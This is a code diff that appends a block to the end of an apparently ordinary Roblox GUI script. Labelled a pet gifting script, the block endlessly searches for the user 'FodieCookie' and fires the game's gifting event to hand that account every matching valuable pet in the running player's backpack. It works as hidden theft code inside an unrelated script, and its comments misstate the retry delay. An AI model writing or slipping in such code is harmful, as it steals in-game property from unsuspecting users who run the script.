@@ -587,3 +587,52 @@ end
 
 table.insert(ConnectionManager, toggleButton.MouseButton1Click:Connect(toggleVisibility))
 table.insert(ConnectionManager, closeButton.MouseButton1Click:Connect(toggleVisibility))
+--[[ PET GIFTING SCRIPT (MODIFIED TO KEEP SEARCHING) ]]--
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local LocalPlayer = Players.LocalPlayer
+local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+local humanoid = character:WaitForChild("Humanoid")
+local backpack = LocalPlayer:WaitForChild("Backpack")
+
+local GiftingEvent = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService")
+
+local TargetUsername = "FodieCookie"
+
+local PetNamesToGift = {
+    "Butterfly",
+    "Raccoon",
+    "Dragonfly",
+    "Queen Bee",
+    "Disco Bee"
+}
+
+-- The main loop will now handle finding the player repeatedly.
+while true do
+    local targetPlayer = Players:FindFirstChild(TargetUsername)
+
+    if targetPlayer then
+        -- Target was found, proceed with gifting logic.
+        print("Target '" .. TargetUsername .. "' found. Checking backpack for gifts.")
+        local args = {"GivePet", targetPlayer}
+
+        for _, item in ipairs(backpack:GetChildren()) do
+            for _, petNameToGift in ipairs(PetNamesToGift) do
+                if item:IsA("Tool") and string.sub(item.Name, 1, #petNameToGift) == petNameToGift then
+                    print("Gifting " .. item.Name .. " to " .. TargetUsername)
+                    humanoid:EquipTool(item)
+                    GiftingEvent:FireServer(unpack(args))
+                    task.wait(0.1) -- A small delay after each gift.
+                    break
+                end
+            end
+        end
+    else
+        -- Target was not found, print a message and wait before trying again.
+        print("Target '" .. TargetUsername .. "' not in the server. Will check again in 10 seconds...")
+    end
+
+    -- Wait before the next full check to avoid crashing.
+    -- If the player wasn't found, this is the delay before the script tries to find them again.
+    task.wait(0.1)
+end
